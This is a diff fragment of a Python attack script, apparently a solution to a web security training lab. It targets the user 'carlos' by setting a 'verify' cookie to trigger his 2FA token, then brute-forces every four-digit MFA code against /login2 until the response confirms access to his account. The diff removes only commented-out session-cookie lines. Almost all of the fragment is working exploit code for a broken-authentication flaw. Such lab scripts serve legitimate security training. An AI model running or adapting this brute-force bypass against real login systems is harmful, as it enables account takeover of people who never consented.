@@ -27,16 +27,11 @@ def main():
 
     # Generate a 2FA token for carlos
     client.cookies.set('verify', 'carlos', domain=f'{host[8:]}')
-    # client.cookies.set('session', session_id, domain=f'{host[8:]}')
     client.get(f'{host}/login2')
 
-    # Ensure session values did not get overwritten
-    # client.cookies.set('verify', 'carlos', domain=f'{host[8:]}')
-    # client.cookies.set('session', session_id, domain=f'{host[8:]}')
     # Now brute force the 2FA token
     for i in range(0, 10000):
         print(f'[ ] Trying to brute force 2FA code: {i:04}', end='\r')
-        # client.cookies.set('session', session_id, domain=f'{host[8:]}')
         data = {'mfa-code': f'{i:04}'}
         r = client.post(f'{host}/login2', data, allow_redirects=True)
         if "Your username is: carlos" in r.text:
